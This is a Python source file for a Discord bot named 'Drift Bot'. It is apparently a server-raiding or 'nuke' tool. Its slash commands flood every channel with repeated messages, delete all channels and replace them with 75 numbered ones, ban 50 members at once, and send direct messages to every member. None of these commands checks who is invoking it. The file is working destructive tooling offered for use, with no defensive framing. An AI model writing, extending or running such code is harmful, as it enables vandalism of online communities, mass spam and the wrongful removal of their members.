
import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import os

TOKEN = os.getenv("DISCORD_TOKEN")  # Use environment variable for token
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    await tree.sync()
    for guild in bot.guilds:
        log_channel = discord.utils.get(guild.text_channels, name="drift-logs")
        if not log_channel:
            log_channel = await guild.create_text_channel("drift-logs")
        await log_channel.send("✅ Drift Bot is online and ready.")

@tree.command(name="spamall", description="Send messages to all channels")
@app_commands.describe(message="Message to send", image="Optional image/gif")
async def spamall(interaction: discord.Interaction, message: str, image: discord.Attachment = None):
    await interaction.response.send_message("⚡ Spamming all channels...", ephemeral=True)
    log_channel = discord.utils.get(interaction.guild.text_channels, name="drift-logs")
    channels = [ch for ch in interaction.guild.text_channels if ch.permissions_for(interaction.guild.me).send_messages]
    for ch in channels:
        try:
            for _ in range(4):
                for _ in range(10):
                    if image:
                        await ch.send(content=message, file=await image.to_file())
                    else:
                        await ch.send(content=message)
                    await asyncio.sleep(1)
        except Exception as e:
            if log_channel:
                await log_channel.send(f"❌ Error in {ch.name}: {e}")

@tree.command(name="resetchannels", description="Delete all channels and recreate 1-75")
async def resetchannels(interaction: discord.Interaction):
    await interaction.response.send_message("♻️ Resetting channels...", ephemeral=True)
    guild = interaction.guild
    for ch in guild.channels:
        await ch.delete()
    for i in range(1, 76):
        await guild.create_text_channel(name=str(i))
    await guild.create_text_channel(name="drift-logs")

@tree.command(name="massban", description="Ban 50 members from the server")
async def massban(interaction: discord.Interaction):
    await interaction.response.send_message("🔨 Banning 50 members...", ephemeral=True)
    count = 0
    for member in interaction.guild.members:
        if not member.bot and count < 50:
            try:
                await member.ban(reason="Mass ban by Drift Bot")
                count += 1
            except:
                continue
    log_channel = discord.utils.get(interaction.guild.text_channels, name="drift-logs")
    if log_channel:
        await log_channel.send(f"✅ Banned {count} users.")

@tree.command(name="dmall", description="DM all users a message")
@app_commands.describe(message="Message to send", image="Optional image/gif")
async def dmall(interaction: discord.Interaction, message: str, image: discord.Attachment = None):
    await interaction.response.send_message("📩 DMing all users...", ephemeral=True)
    for member in interaction.guild.members:
        if not member.bot:
            try:
                if image:
                    await member.send(content=message, file=await image.to_file())
                else:
                    await member.send(content=message)
                await asyncio.sleep(1)
            except:
                continue

@tree.command(name="add-channels", description="Add new channels with custom names")
@app_commands.describe(names="Comma-separated list of channel names")
async def add_channels(interaction: discord.Interaction, names: str):
    await interaction.response.send_message("➕ Adding channels...", ephemeral=True)
    for name in names.split(','):
        await interaction.guild.create_text_channel(name=name.strip())
